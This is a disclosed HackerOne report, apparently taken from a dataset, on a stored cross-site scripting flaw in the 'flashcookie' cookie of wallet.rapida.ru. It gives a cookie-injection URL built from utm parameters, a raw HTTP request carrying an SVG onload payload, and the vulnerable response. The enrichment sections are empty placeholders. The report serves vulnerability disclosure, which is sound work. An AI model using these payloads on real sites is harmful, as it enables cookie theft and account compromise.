---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '164662'
original_report_id: '164662'
title: '[wallet.rapida.ru] XSS Cookie flashcookie'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2016-08-31T08:32:43.947Z'
disclosed_at: '2018-11-18T07:24:36.841Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 17
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [wallet.rapida.ru] XSS Cookie flashcookie

## Metadata

- HackerOne Report ID: 164662
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2018-11-18T07:24:36.841Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Steps to reproduce**
1) Заражаем cookie пользователя. Можно использовать Cookie Injection, XSS или CRLF Injection на *.rapida.ru

Так как используется Django и не самый свежий Python, то возможно сделать Cookie Injection через Google Analytics (тут расписана эта атака https://habrahabr.ru/post/272187/).
```
https://rapida.ru/?utm_medium=1&utm_name=2&utm_source=3&utm_term=4&utm_content=test]flashcookie="{\"info\":[\"\\\\x3csvg/onload=alert(document.cookie)\\\\x3etest\"]}"
```
Более того, за счет использования бага обработки Cookie - flashcookie не очищается и javascript выполняется при каждом запросе.

2) Открываем https://wallet.rapida.ru/


**HTTP Request**

```http
GET / HTTP/1.1
Host: wallet.rapida.ru
Cookie: flashcookie="{\"info\": [\"\\\\x3csvg/onload=alert(document.domain)\\\\x3etest\"]}"
Connection: close

```

**HTTP Response**

```html
        <script type="text/javascript">
            $.msg(
                    {
                        afterBlock: function() {
                            flashAfterBlock(this);
                        },
                        autoUnblock : false,
                        content:'\x3csvg/onload=alert(document.domain)\x3etest',
                        bgPath: '/static/images/',
                        css:{
                            background: '#FFEAA8'
                        }
                    }
            );
        </script>
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
